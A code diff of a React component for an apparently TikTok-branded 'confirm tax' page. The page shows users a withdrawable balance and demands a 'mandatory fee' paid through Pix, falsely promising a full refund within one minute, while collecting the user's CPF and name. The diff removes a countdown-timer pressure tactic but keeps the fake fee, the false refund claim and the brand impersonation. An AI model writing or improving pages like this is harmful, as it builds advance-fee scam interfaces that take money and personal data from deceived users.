@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Check, Clock, Loader2, ShieldCheck, ChevronDown } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
 import tiktokLogo from "@/assets/tiktok-logo.png";
@@ -37,50 +37,21 @@ const FunnelConfirmTax = ({
   balance, pixKey, pixKeyType = "E-mail", pixName, onGeneratePix, isGenerating,
   taxAmount = "R$ 34,71", taxAnchor = "R$ 89,90", taxDiscount = "61% OFF", leadCpf, leadName,
 }: FunnelConfirmTaxProps) => {
-  const [timeLeft, setTimeLeft] = useState(() => {
-    const stored = sessionStorage.getItem('funnel_countdown_start');
-    if (stored) {
-      const elapsed = Math.floor((Date.now() - parseInt(stored, 10)) / 1000);
-      return Math.max(0, 5 * 60 - elapsed);
-    }
-    sessionStorage.setItem('funnel_countdown_start', Date.now().toString());
-    return 5 * 60;
-  });
-
-  useEffect(() => {
-    if (timeLeft <= 0) return;
-    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, t - 1)), 1000);
-    return () => clearInterval(timer);
-  }, [timeLeft]);
-
-  const formatTime = (s: number) => {
-    const m = Math.floor(s / 60);
-    const sec = s % 60;
-    return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
-  };
   const maskCpf = (cpf: string) => {
     const digits = cpf.replace(/\D/g, '');
     if (digits.length >= 11) return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
     return cpf;
   };
-  const isUrgent = timeLeft < 120;
-  const firstName = leadName ? leadName.split(" ")[0] : "";
 
   return (
     <div className="fixed inset-0 z-[80] bg-[#F8F8F8] overflow-y-auto pt-6">
       <div className="py-4 flex justify-center bg-white">
         <img src={tiktokLogo} alt="TikTok" className="h-6 w-auto" />
       </div>
-      <div className={`py-2.5 px-4 text-center transition-colors duration-300 ${isUrgent ? "bg-red-600 animate-pulse" : "bg-orange-500"}`}>
-        <p className="text-white text-xs font-bold tracking-wide">
-          ⏳ {firstName ? `${firstName}, oferta` : "Oferta"} expira em <span className="font-mono text-sm">{formatTime(timeLeft)}</span>
-          {isUrgent && " — Corra!"}
-        </p>
-      </div>
 
       <main className="px-3 py-2.5 space-y-2.5 max-w-md mx-auto pb-24">
         <div className="bg-black rounded-xl p-4">
-          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">{firstName ? `SALDO RESERVADO PARA ${firstName.toUpperCase()}` : "SALDO DISPONÍVEL"}</p>
+          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">SALDO DISPONÍVEL</p>
           <p className="text-white text-[26px] font-extrabold tracking-tight leading-none">{balance}</p>
           <p className="text-white/80 text-xs mt-1.5">Aguardando confirmação para saque</p>
         </div>
@@ -105,7 +76,7 @@ const FunnelConfirmTax = ({
             <span className="bg-[#E8F5E9] text-[#4CAF50] text-[10px] font-semibold px-2 py-1 rounded">{taxDiscount}</span>
           </div>
           <div className="bg-[#FFF3E0] border border-orange-200 rounded-lg px-3 py-2 mb-3">
-            <p className="text-orange-800 text-[11px] font-semibold">🔥 Promoção válida apenas nos próximos {formatTime(timeLeft)}</p>
+            <p className="text-orange-800 text-[11px] font-semibold">🔥 Promoção por tempo limitado</p>
           </div>
           <p className="text-gray-500 text-xs leading-relaxed">
             Taxa obrigatória para liberação do saque no valor de <span className="font-bold text-gray-800">{balance}</span>. O valor de <span className="font-bold text-gray-800">{taxAmount}</span> será reembolsado integralmente para você em 1 minuto.
